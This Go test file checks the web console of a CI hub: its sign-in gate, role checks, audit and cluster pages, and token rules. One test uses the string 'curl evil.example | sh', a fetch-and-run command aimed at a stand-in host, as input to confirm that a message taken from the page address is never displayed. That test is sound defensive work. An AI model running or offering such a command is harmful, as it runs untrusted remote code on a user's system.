package web

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/hoobiboobi/ci-accelerator/internal/auth"
	"github.com/hoobiboobi/ci-accelerator/internal/fleet"
	"github.com/hoobiboobi/ci-accelerator/internal/store"
)

// gateSigner signs in one person (anyone with a cookie, or nobody) who may
// read the projects in allow; it counts the questions.
type gateSigner struct {
	Signer
	allow map[uint64]bool
	asked *atomic.Int64
}

func (gateSigner) PublicURL() string { return "https://hub.example.com" }
func (gateSigner) Load(w http.ResponseWriter, r *http.Request) (*auth.Viewer, error) {
	if _, err := r.Cookie(auth.SessionCookie); err != nil {
		return nil, nil
	}
	return &auth.Viewer{Instance: "0a1b2c", Host: "gitlab.example.com", UserID: 8, Username: "bob"}, nil
}
func (g gateSigner) Check(r *http.Request) (*auth.Viewer, error) { return g.Load(nil, r) }
func (g gateSigner) CanRead(_ context.Context, v *auth.Viewer, _ string, project uint64) (bool, error) {
	if g.asked != nil {
		g.asked.Add(1)
	}
	return v != nil && g.allow[project], nil
}

// gated is a hub's root pages behind the sign-in gate, as the hub serves
// them; next, when set, stands for the hub's other handlers.
func gated(t *testing.T, f fakeFleet, g gateSigner, next http.Handler) *httptest.Server {
	t.Helper()
	srv, err := New(Empty{}, testLogger(), Options{Fleet: f, Auth: g, Version: "test",
		Hub: &Hub{Who: func(*http.Request) fleet.Principal { return fleet.Principal{} }}})
	if err != nil {
		t.Fatal(err)
	}
	srv.now = func() time.Time { return testNow }
	mux := http.NewServeMux()
	srv.Register(mux)
	var h http.Handler = mux
	if next != nil {
		h = next
	}
	ts := httptest.NewServer(srv.Gate(h))
	t.Cleanup(ts.Close)
	return ts
}

func send(t *testing.T, ts *httptest.Server, path string, signedIn bool, header map[string]string) page {
	t.Helper()
	req, _ := http.NewRequest("GET", ts.URL+path, nil)
	if signedIn {
		req.AddCookie(&http.Cookie{Name: auth.SessionCookie, Value: "the-session-secret"})
	}
	for k, v := range header {
		req.Header.Set(k, v)
	}
	c := ts.Client()
	c.CheckRedirect = func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }
	res, err := c.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	var b strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := res.Body.Read(buf)
		b.Write(buf[:n])
		if err != nil {
			break
		}
	}
	return page{res.StatusCode, res.Header, b.String(), path}
}

// A hub never hands a person's session to a cluster's controller: the
// clusters are not trusted with it.
func TestHubGateKeepsTheSession(t *testing.T) {
	var got []string
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = append(got, auth.CookieFrom(r.Context()))
	})
	ts := gated(t, fakeFleet{}, gateSigner{}, next)
	for _, p := range []string{"/m/eu/builds", "/pipelines/0a1b2c/5", "/jobs/0a1b2c/7"} {
		send(t, ts, p, true, nil)
	}
	if len(got) != 3 {
		t.Fatalf("requests through the gate: %d", len(got))
	}
	for i, c := range got {
		if c != "" {
			t.Errorf("request %d carries the session to the clusters: %q", i, c)
		}
	}
	// A box's web still passes it to its own controller.
	box, err := New(Empty{}, testLogger(), Options{Auth: gateSigner{}})
	if err != nil {
		t.Fatal(err)
	}
	got = nil
	bts := httptest.NewServer(box.Gate(next))
	defer bts.Close()
	send(t, bts, "/builds", true, nil)
	if len(got) != 1 || got[0] != "the-session-secret" {
		t.Errorf("a box's controller gets no session: %q", got)
	}
}

// Streams and data under a cluster's address answer 401 without a
// session, as at a box: only pages are sent to sign in. The hub's own API
// decides who may call it, viewers too.
func TestHubGatePaths(t *testing.T) {
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {})
	ts := gated(t, fakeFleet{}, gateSigner{}, next)
	for path, want := range map[string]int{"/m/a/events": 401, "/m/a/search-index": 401, "/m/a/api/v1/builds": 401,
		"/m/a/builds": 302, "/m/a/": 302, "/events": 401} {
		if p := send(t, ts, path, false, nil); p.status != want {
			t.Errorf("signed out %s: %d, want %d", path, p.status, want)
		}
	}
	if p := send(t, ts, "/api/v1/fleet/version", true, nil); p.status != 200 {
		t.Errorf("a viewer's session on the hub's API: %d %s", p.status, p.body)
	}
	if p := send(t, ts, "/api/v1/builds", true, nil); p.status != http.StatusForbidden {
		t.Errorf("a viewer's session on the console's JSON API: %d", p.status)
	}
}

// Nobody signed in learns nothing of the fleet, even on a page the gate
// lets through.
func TestHubSignedOutSeesNoFleet(t *testing.T) {
	ts := gated(t, fakeFleet{}, gateSigner{}, nil)
	for _, path := range []string{"/auth/zzz", "/static%2Fx", "/auth%2Fx"} {
		p := send(t, ts, path, false, nil)
		for _, leak := range []string{">ap<", `href="/m/eu/"`, "connected"} {
			if strings.Contains(p.body, leak) {
				t.Errorf("signed out %s (%d): shows %q", path, p.status, leak)
			}
		}
	}
}

// A pipeline or a job across clusters shows only to people who may read
// its project, as each cluster's own pages do.
func TestHubPipelineReadsAsThePerson(t *testing.T) {
	jobs := []store.JobInfo{{Instance: "0a1b2c", ID: 7, ProjectID: 42, Name: "build-secret", Stage: "build", Node: "n1"},
		{Instance: "0a1b2c", ID: 8, ProjectID: 42, Name: "test-secret", Stage: "test"}}
	f := fakeFleet{hits: map[string][]FleetHit{
		"p50": {{Member: "eu", Pipeline: &store.Pipeline{ID: 50, ProjectID: 42, CommitTitle: "SECRET title", ProjectPath: "secret/project", Ref: "embargoed"}, Jobs: jobs},
			{Member: "us", Jobs: []store.JobInfo{{Instance: "0a1b2c", ID: 8, ProjectID: 42, Name: "test-secret", PodCreated: testNow}}}},
		"p51": {{Member: "eu", Pipeline: &store.Pipeline{ID: 51, ProjectID: 42}}},
		"j7":  {{Member: "eu", Job: &jobs[0]}},
	}}
	denied := gated(t, f, gateSigner{allow: map[uint64]bool{}}, nil)
	for _, path := range []string{"/pipelines/0a1b2c/50", "/pipelines/0a1b2c/51", "/jobs/0a1b2c/7"} {
		p := send(t, denied, path, true, nil)
		if p.status != http.StatusNotFound {
			t.Errorf("no access, %s: %d", path, p.status)
		}
		for _, leak := range []string{"SECRET", "secret/project", "embargoed", "build-secret", "test-secret"} {
			if strings.Contains(p.body, leak) {
				t.Errorf("no access, %s shows %q", path, leak)
			}
		}
	}
	allowed := gated(t, f, gateSigner{allow: map[uint64]bool{42: true}}, nil)
	if p := send(t, allowed, "/pipelines/0a1b2c/50", true, nil); p.status != 200 || !strings.Contains(p.body, "SECRET title") {
		t.Errorf("with access: %d", p.status)
	}
	if p := send(t, allowed, "/jobs/0a1b2c/7", true, nil); p.status != http.StatusFound {
		t.Errorf("a job with access: %d", p.status)
	}
}

// When several clusters say they ran a job, the person chooses: the
// fastest answer does not decide.
func TestHubJobClaimedTwice(t *testing.T) {
	f := fakeFleet{hits: map[string][]FleetHit{
		"j7": {{Member: "us", Job: &store.JobInfo{ID: 7, Node: "n2"}}, {Member: "eu", Job: &store.JobInfo{ID: 7, Node: "n1"}}},
	}}
	srv, err := New(Empty{}, testLogger(), Options{Fleet: f})
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	srv.Register(mux)
	ts := httptest.NewServer(mux)
	defer ts.Close()
	p := get(t, ts, "/jobs/0a1b2c/7")
	if p.status != 200 || !strings.Contains(p.body, `href="/m/eu/jobs/0a1b2c/7"`) || !strings.Contains(p.body, `href="/m/us/jobs/0a1b2c/7"`) {
		t.Errorf("a job two clusters claim: %d %q", p.status, p.header.Get("Location"))
	}
}

// A cluster names the projects of its pages; the hub asks GitLab about a
// bounded number of them, with the person's token.
func TestHubAsksAboutBoundedProjects(t *testing.T) {
	var asked atomic.Int64
	srv, err := New(manyProjects{n: 900}, testLogger(), Options{Fleet: fakeFleet{current: "eu"}, Base: "/m/eu", Auth: gateSigner{asked: &asked}})
	if err != nil {
		t.Fatal(err)
	}
	r := httptest.NewRequest("GET", "/m/eu/", nil)
	r = r.WithContext(auth.With(r.Context(), &auth.Viewer{Instance: "0a1b2c", Username: "bob"}))
	if _, err := srv.shell(r, "pipelines", ""); err != nil {
		t.Fatal(err)
	}
	if n := asked.Load(); n == 0 || n > 500 {
		t.Errorf("GitLab asked %d times for one page", n)
	}
}

type manyProjects struct {
	Empty
	n int
}

func (m manyProjects) Projects(context.Context) ([]store.Project, error) {
	out := make([]store.Project, m.n)
	for i := range out {
		out[i] = store.Project{ProjectKey: store.ProjectKey{Instance: "0a1b2c", ID: uint64(i + 1)}}
	}
	return out, nil
}

// Every hub page and change refuses a person without the role, and a hub
// without sign-in changes nothing from its pages; nothing in the registry
// moves either way.
func TestHubRoutesRefuse(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	form := url.Values{"name": {"prod"}, "joins": {"token"}, "storage": {"emptyDir"}, "gitlab_url": {"https://gitlab.example.com/"},
		"runner_token": {"glrt-not-a-real-token"}}
	if p := as(t, ts, "operator", "POST", "/clusters", form); p.status != 200 {
		t.Fatalf("create: %d", p.status)
	}
	snapshot := func() string {
		set, _ := reg.Settings(ctx, "prod")
		js, _ := reg.JoinTokens(ctx, "prod")
		toks, _ := reg.Tokens(ctx)
		bs, _ := reg.Bindings(ctx)
		_, newErr := reg.Settings(ctx, "fresh")
		return set.UpdatedAt.String() + "|" + strings.Repeat("j", len(js)) + "|" + strings.Repeat("t", len(toks)) + "|" +
			strings.Repeat("b", len(bs)) + "|" + string(reg.RoleOf("gitlab:gitlab.example.com/2")) + "|" + errString(newErr)
	}
	before := snapshot()
	change := url.Values{"name": {"fresh"}, "joins": {"token"}, "storage": {"emptyDir"}, "gitlab_url": {"https://gitlab.example.com/"},
		"runner_token": {"glrt-not-a-real-token"}, "subject": {"gitlab:gitlab.example.com/2"}, "role": {"owner"}, "days": {"30"}}
	routes := []struct{ method, path string }{
		{"GET", "/clusters/new"}, {"POST", "/clusters"}, {"GET", "/clusters/prod"}, {"GET", "/clusters/prod/edit"},
		{"POST", "/clusters/prod"}, {"POST", "/clusters/prod/join"}, {"POST", "/clusters/prod/remove"},
		{"GET", "/access"}, {"GET", "/access/tokens"}, {"GET", "/audit"},
		{"POST", "/access/people"}, {"POST", "/access/people/remove"}, {"POST", "/access/tokens"}, {"POST", "/access/tokens/revoke"},
	}
	for _, c := range routes {
		if p := as(t, ts, "viewer", c.method, c.path, change); p.status != http.StatusForbidden {
			t.Errorf("viewer %s %s: %d", c.method, c.path, p.status)
		}
	}
	if after := snapshot(); after != before {
		t.Errorf("a viewer changed the registry: %s -> %s", before, after)
	}
	// Without sign-in: reading pages open, every change refused, whoever
	// the request claims to be.
	off, reg2 := hubAdmin(t, false)
	if _, _, err := reg2.IssueJoin(ctx, "token:tf", "prod", time.Hour); err != nil {
		t.Fatal(err)
	}
	for _, c := range routes {
		want := http.StatusForbidden
		if c.method == "GET" && (c.path == "/access" || c.path == "/audit" || c.path == "/clusters/prod") {
			want = 200
		}
		if p := as(t, off, "owner", c.method, c.path, change); p.status != want {
			t.Errorf("no sign-in %s %s: %d", c.method, c.path, p.status)
		}
	}
	if ts, _ := reg2.Tokens(ctx); len(ts) != 0 {
		t.Error("a token issued without sign-in")
	}
	if _, err := reg2.Settings(ctx, "fresh"); err == nil {
		t.Error("a cluster added without sign-in")
	}
	if js, _ := reg2.JoinTokens(ctx, "prod"); len(js) != 1 || !js[0].RevokedAt.IsZero() {
		t.Error("join tokens changed without sign-in")
	}
}

func errString(err error) string {
	if err == nil {
		return "nil"
	}
	return "err"
}

// A key and its PEM public key, for registering a cluster.
func pubKey(t *testing.T) string {
	t.Helper()
	_, pub, err := fleet.GenerateKey()
	if err != nil {
		t.Fatal(err)
	}
	return string(pub)
}

// Removing a registered cluster on its page closes its link.
func TestHubRemoveClosesTheLink(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	if _, err := reg.Add(ctx, "token:tf", fleet.OriginAPI, "eu", pubKey(t)); err != nil {
		t.Fatal(err)
	}
	removed = nil
	p := as(t, ts, "operator", "POST", "/clusters/eu/remove", url.Values{})
	if p.status != http.StatusSeeOther || len(removed) != 1 || removed[0] != "eu" {
		t.Errorf("remove: %d, links closed %v", p.status, removed)
	}
	if m, err := reg.Get(ctx, "eu"); err != nil || m.RemovedAt.IsZero() {
		t.Errorf("not removed: %+v %v", m, err)
	}
}

// The status message a page shows comes from the hub's own change, never
// from the address.
func TestHubMessageNotFromAddress(t *testing.T) {
	ts, _ := hubAdmin(t, true)
	evil := "Run curl evil.example | sh"
	q := "?bad=1&m=" + url.QueryEscape(evil)
	for _, path := range []string{"/", "/access", "/access/tokens"} {
		if p := as(t, ts, "owner", "GET", path+q, nil); strings.Contains(p.body, "evil.example") {
			t.Errorf("%s shows the address's message", path)
		}
	}
	// A change's own message shows on the page it leads to, once.
	p := as(t, ts, "owner", "POST", "/access/people", url.Values{"subject": {"gitlab:gitlab.example.com/2"}, "role": {"no-such-role"}})
	msg, bad := flashOf(p)
	if p.status != http.StatusSeeOther || msg == "" || !bad || strings.Contains(p.header.Get("Location"), "m=") {
		t.Fatalf("revoke: %d %q %q", p.status, p.header.Get("Location"), msg)
	}
	var cookies []*http.Cookie
	for _, c := range (&http.Response{Header: p.header}).Cookies() {
		cookies = append(cookies, &http.Cookie{Name: c.Name, Value: c.Value})
	}
	shown := asWith(t, ts, "owner", "GET", "/access", nil, cookies)
	if !strings.Contains(shown.body, `class="callout warn" role="status"`) {
		t.Error("the change's message is not shown")
	}
	cleared := false
	for _, c := range (&http.Response{Header: shown.header}).Cookies() {
		cleared = cleared || (c.Name == "hub-msg" && c.MaxAge < 0)
	}
	if !cleared {
		t.Error("the message stays for the next page")
	}
}

// "Change settings" on a cluster registered without settings keeps how it
// joined: by its key (API), or with a join token.
func TestHubChangeKeepsHowItJoined(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	if _, err := reg.Add(ctx, "token:tf", fleet.OriginAPI, "by-key", pubKey(t)); err != nil {
		t.Fatal(err)
	}
	_, secret, err := reg.IssueJoin(ctx, "token:tf", "by-token", time.Hour)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := reg.Join(ctx, "by-token", secret, pubKey(t)); err != nil {
		t.Fatal(err)
	}
	ch := url.Values{"storage": {"emptyDir"}, "gitlab_url": {"https://gitlab.example.com/"}, "joins": {"token"},
		"runner_token": {"glrt-not-a-real-token"}}
	p := as(t, ts, "operator", "POST", "/clusters/by-key", ch)
	if p.status != 200 || !strings.Contains(p.body, "Upgrade by-key") || !strings.Contains(p.body, "fleet-key") || strings.Contains(p.body, "fleet-join") {
		t.Errorf("by key: %d", p.status)
	}
	if set, _ := reg.Settings(ctx, "by-key"); set.Values["joins"] != "key" {
		t.Errorf("by key, saved: %v", set.Values)
	}
	if c := as(t, ts, "operator", "GET", "/clusters/by-key", nil); strings.Contains(c.body, "Token valid for") {
		t.Error("a cluster joined by key shows a token's lifetime")
	}
	p = as(t, ts, "operator", "POST", "/clusters/by-token", ch)
	if p.status != 200 || !strings.Contains(p.body, "fleet-join") || strings.Contains(p.body, "fleet-key") {
		t.Errorf("by token: %d", p.status)
	}
}

// Addresses of a cluster nobody added change nothing and say so.
func TestHubUnknownClusterNames(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	if p := as(t, ts, "operator", "GET", "/clusters/ghost/edit", nil); p.status != http.StatusNotFound {
		t.Errorf("edit ghost: %d", p.status)
	}
	if p := as(t, ts, "operator", "POST", "/clusters/ghost", url.Values{"storage": {"emptyDir"}, "gitlab_url": {"https://gitlab.example.com/"}}); p.status != http.StatusNotFound {
		t.Errorf("change ghost: %d", p.status)
	}
	if _, err := reg.Settings(ctx, "ghost"); err == nil {
		t.Error("settings made for a name nobody added")
	}
	p := as(t, ts, "operator", "POST", "/clusters/ghost/remove", url.Values{})
	if msg, bad := flashOf(p); !bad || strings.Contains(msg, "is removed") {
		t.Errorf("remove ghost: %q bad=%v", msg, bad)
	}
	// A name with only a join token (issued through the API) has a page.
	if _, _, err := reg.IssueJoin(ctx, "token:tf", "api-only", time.Hour); err != nil {
		t.Fatal(err)
	}
	if c := as(t, ts, "operator", "GET", "/clusters/api-only", nil); c.status != 200 || !strings.Contains(c.body, "Join tokens") {
		t.Errorf("a name with a join token: %d", c.status)
	}
}

// The audit names people by the label they chose and by who they are; a
// filter chosen from older records stays chosen; actions read as words;
// times are clock times.
func TestHubAuditPage(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	if err := reg.NoteName(ctx, "gitlab:gitlab.example.com/2", "Alice Smith @alice"); err != nil {
		t.Fatal(err)
	}
	as(t, ts, "operator", "POST", "/clusters", url.Values{"name": {"prod"}, "joins": {"token"}, "storage": {"emptyDir"},
		"gitlab_url": {"https://gitlab.example.com/"}, "runner_token": {"glrt-not-a-real-token"}})
	p := as(t, ts, "operator", "GET", "/audit", nil)
	for _, want := range []string{"Alice Smith @alice (gitlab.example.com/2)", "issued a join token", `title="join-token.issue"`} {
		if !strings.Contains(p.body, want) {
			t.Errorf("audit: no %q", want)
		}
	}
	f := as(t, ts, "operator", "GET", "/audit?who="+url.QueryEscape("gitlab:gitlab.example.com/99"), nil)
	if !strings.Contains(f.body, `<option value="gitlab:gitlab.example.com/99" selected>`) {
		t.Error("a filter outside the recent records is not shown as chosen")
	}
}

// Times on a cluster's page are in the reader's zone, and say UTC when
// that is unknown.
func TestHubClusterTimes(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	as(t, ts, "operator", "POST", "/clusters", url.Values{"name": {"prod"}, "joins": {"token"}, "storage": {"emptyDir"},
		"gitlab_url": {"https://gitlab.example.com/"}, "runner_token": {"glrt-not-a-real-token"}})
	set, err := reg.Settings(ctx, "prod")
	if err != nil {
		t.Fatal(err)
	}
	tokyo, _ := time.LoadLocation("Asia/Tokyo")
	c := asWith(t, ts, "operator", "GET", "/clusters/prod", nil, []*http.Cookie{{Name: "tz", Value: "Asia%2FTokyo"}})
	if want := "changed <span title=\"" + set.UpdatedAt.UTC().Format("2006-01-02 15:04:05") + " UTC\">" + set.UpdatedAt.In(tokyo).Format("Jan 2 15:04"); !strings.Contains(c.body, want) {
		t.Errorf("changed, in Tokyo: no %q", want)
	}
	if strings.Contains(c.body, "list v") {
		t.Error("the settings list's version on the page")
	}
	if u := as(t, ts, "operator", "GET", "/clusters/prod", nil); !strings.Contains(u.body, " UTC</td>") {
		t.Error("a join token's time without a zone says nothing of UTC")
	}
}

// Without sign-in, the pages do not speak of roles or buttons that do not
// exist there.
func TestHubWithoutSignInTexts(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, false)
	p := as(t, ts, "", "GET", "/clusters/new", nil)
	if p.status != http.StatusForbidden || strings.Contains(p.body, "An owner can give you a role") || !strings.Contains(p.body, "Sign-in is off") {
		t.Errorf("no sign-in, the form: %d", p.status)
	}
	if _, err := reg.Add(ctx, "token:tf", fleet.OriginAPI, "eu", pubKey(t)); err != nil {
		t.Fatal(err)
	}
	if c := as(t, ts, "", "GET", "/clusters/eu", nil); strings.Contains(c.body, "Change settings") {
		t.Error("no sign-in: the cluster's page speaks of a button it has not")
	}
}

// API tokens: the console takes the lifetimes the API takes, and its tab
// counts the tokens that open the hub.
func TestHubTokenPage(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	for _, days := range []string{"5000", "soon", "0"} {
		p := as(t, ts, "owner", "POST", "/access/tokens", url.Values{"name": {"tf-" + days}, "role": {"owner"}, "days": {days}})
		if _, bad := flashOf(p); !bad {
			t.Errorf("days=%s: %d, not refused", days, p.status)
		}
	}
	if ts, _ := reg.Tokens(ctx); len(ts) != 0 {
		t.Errorf("tokens issued with a lifetime the API refuses: %d", len(ts))
	}
	as(t, ts, "owner", "POST", "/access/tokens", url.Values{"name": {"t1"}, "role": {"owner"}, "days": {"30"}})
	as(t, ts, "owner", "POST", "/access/tokens", url.Values{"name": {"t2"}, "role": {"owner"}, "days": {"30"}})
	as(t, ts, "owner", "POST", "/access/tokens/revoke", url.Values{"name": {"t2"}})
	if p := as(t, ts, "owner", "GET", "/access", nil); !strings.Contains(p.body, "API tokens · 2") {
		t.Error("the tab counts tokens that open nothing")
	}
}

// An owner's own role is changed by another owner, not by a click on
// their own row.
func TestHubOwnRole(t *testing.T) {
	ts, reg := hubAdmin(t, true)
	p := as(t, ts, "owner2", "POST", "/access/people", url.Values{"subject": {"gitlab:gitlab.example.com/5"}, "role": {"operator"}})
	if _, bad := flashOf(p); !bad || reg.RoleOf("gitlab:gitlab.example.com/5") != fleet.Owner {
		t.Errorf("own role: %s", reg.RoleOf("gitlab:gitlab.example.com/5"))
	}
	as(t, ts, "owner2", "POST", "/access/people/remove", url.Values{"subject": {"gitlab:gitlab.example.com/5"}})
	if reg.RoleOf("gitlab:gitlab.example.com/5") != fleet.Owner {
		t.Error("an owner removed their own role")
	}
}

// Members: a recent store replacement is a warning; a cluster away is a
// link (its pages as last seen).
func TestHubMembersStates(t *testing.T) {
	srv, err := New(Empty{}, testLogger(), Options{Fleet: fakeFleet{}})
	if err != nil {
		t.Fatal(err)
	}
	srv.now = func() time.Time { return testNow }
	mux := http.NewServeMux()
	srv.Register(mux)
	ts := httptest.NewServer(mux)
	defer ts.Close()
	p := get(t, ts, "/")
	if !strings.Contains(p.body, `<span class="chip warn">connected · store replaced`) {
		t.Error("a store replaced is not a warning")
	}
	if !strings.Contains(p.body, `href="/m/ap/"`) {
		t.Error("an away cluster has no link")
	}
}

// A refused form says so at its top, points at the fields and asks for
// the secrets again; secret fields are not passwords to save.
func TestHubRefusedForm(t *testing.T) {
	ts, _ := hubAdmin(t, true)
	p := as(t, ts, "operator", "POST", "/clusters", url.Values{"name": {"Bad Name"}, "joins": {"token"}, "storage": {"emptyDir"},
		"gitlab_url": {"https://gitlab.example.com/"}, "runner_token": {"glrt-not-a-real-token"}})
	for _, want := range []string{`role="alert"`, "enter them again", `aria-describedby="e-name"`, "autofocus"} {
		if !strings.Contains(p.body, want) {
			t.Errorf("refused form: no %q", want)
		}
	}
	if strings.Contains(p.body, "new-password") {
		t.Error("secret fields invite a password manager")
	}
}

// A role for a GitLab nobody signs in with is refused: nobody would hold it.
func TestHubGrantUnknownHost(t *testing.T) {
	ts, reg := hubAdmin(t, true)
	for _, host := range []string{"gitlab.exmple.com", "gitlab.example.com:443"} {
		p := as(t, ts, "owner", "POST", "/access/people", url.Values{"gitlab": {host}, "user": {"42"}, "role": {"owner"}})
		msg, bad := flashOf(p)
		if p.status != http.StatusSeeOther || !bad || msg != host+" is none of the GitLabs people sign in with" {
			t.Errorf("%s: %d %q %v", host, p.status, msg, bad)
		}
		if r := reg.RoleOf("gitlab:" + host + "/42"); r != fleet.Viewer {
			t.Errorf("%s: given %s", host, r)
		}
	}
	if p := as(t, ts, "owner", "POST", "/access/people", url.Values{"gitlab": {"GitLab.Example.com"}, "user": {"42"}, "role": {"operator"}}); reg.RoleOf("gitlab:gitlab.example.com/42") != fleet.Operator {
		t.Errorf("the sign-in host in other case: %d", p.status)
	}
}

// Removing a cluster from its page is the API's removal: its unused join
// token, settings and secrets go in the same transaction.
func TestHubRemoveIsOneRemoval(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	p := as(t, ts, "operator", "POST", "/clusters", url.Values{"name": {"ap2"}, "joins": {"token"}, "storage": {"emptyDir"},
		"gitlab_url": {"https://gitlab.example.com/"}, "runner_token": {"glrt-not-a-real-token"}})
	if p.status != 200 {
		t.Fatalf("add: %d", p.status)
	}
	removed = nil
	if p := as(t, ts, "operator", "POST", "/clusters/ap2/remove", url.Values{}); p.status != http.StatusSeeOther {
		t.Fatalf("remove: %d", p.status)
	}
	if len(removed) != 0 {
		t.Errorf("a link closed for a cluster that never joined: %v", removed)
	}
	if _, err := reg.Settings(ctx, "ap2"); err == nil {
		t.Error("settings kept")
	}
	evs, err := reg.AuditQuery(ctx, fleet.AuditQuery{Target: "ap2"})
	if err != nil {
		t.Fatal(err)
	}
	var revoke, forget bool
	for _, e := range evs {
		revoke = revoke || (e.Action == "join-token.revoke" && e.Detail == "1 unused, the cluster removed")
		forget = forget || e.Action == "settings.delete"
	}
	if !revoke || !forget {
		t.Errorf("not the one removal: %+v", evs)
	}
}

// A hub without a secrets key adds a cluster: its secrets are made in the
// cluster by hand, and the form does not ask for them.
func TestHubAddWithoutSecretsKey(t *testing.T) {
	ts, _ := hubAdminWith(t, true, func(h *Hub) { h.Sealer = nil })
	p := as(t, ts, "operator", "POST", "/clusters", url.Values{"name": {"ap3"}, "joins": {"token"}, "storage": {"emptyDir"},
		"gitlab_url": {"https://gitlab.example.com/"}})
	if p.status != 200 || !strings.Contains(p.body, "Install ap3") {
		t.Errorf("add without a secrets key: %d", p.status)
	}
}

// "new" is the address of the form, not a cluster's.
func TestHubNameNew(t *testing.T) {
	ts, reg := hubAdmin(t, true)
	p := as(t, ts, "operator", "POST", "/clusters", url.Values{"name": {"new"}, "joins": {"token"}, "storage": {"emptyDir"},
		"gitlab_url": {"https://gitlab.example.com/"}, "runner_token": {"glrt-not-a-real-token"}})
	if p.status != http.StatusUnprocessableEntity || !strings.Contains(p.body, "the address of the Add a cluster form") {
		t.Errorf("a cluster named new: %d", p.status)
	}
	if _, err := reg.Settings(context.Background(), "new"); err == nil {
		t.Error("settings saved for new")
	}
}

// The install page says to save the values file; a secret that does not
// open with the hub's key says to enter it again.
func TestHubValuesFileAndStaleSecret(t *testing.T) {
	ctx := context.Background()
	ts, reg := hubAdmin(t, true)
	p := as(t, ts, "operator", "POST", "/clusters", url.Values{"name": {"ap4"}, "joins": {"token"}, "storage": {"emptyDir"},
		"gitlab_url": {"https://gitlab.example.com/"}, "runner_token": {"glrt-not-a-real-token"}})
	if p.status != 200 || !strings.Contains(p.body, "Save the values below as ap4.values.yaml") {
		t.Errorf("install page: %d", p.status)
	}
	if c := as(t, ts, "operator", "GET", "/clusters/ap4", nil); strings.Contains(c.body, "enter it again") {
		t.Error("a secret that opens is called stale")
	}
	other, _ := fleet.NewSealer([]byte("fedcba9876543210fedcba9876543210"))
	if _, err := reg.SaveSettings(ctx, other, "token:tf", "ap5", map[string]string{"joins": "token", "storage": "emptyDir",
		"gitlab_url": "https://gitlab.example.com/", "runner_token": "glrt-not-a-real-token"}); err != nil {
		t.Fatal(err)
	}
	if c := as(t, ts, "operator", "GET", "/clusters/ap5", nil); c.status != 200 || !strings.Contains(c.body, "does not open with the hub's secrets key: enter it again") {
		t.Errorf("a stale secret: %d", c.status)
	}
}
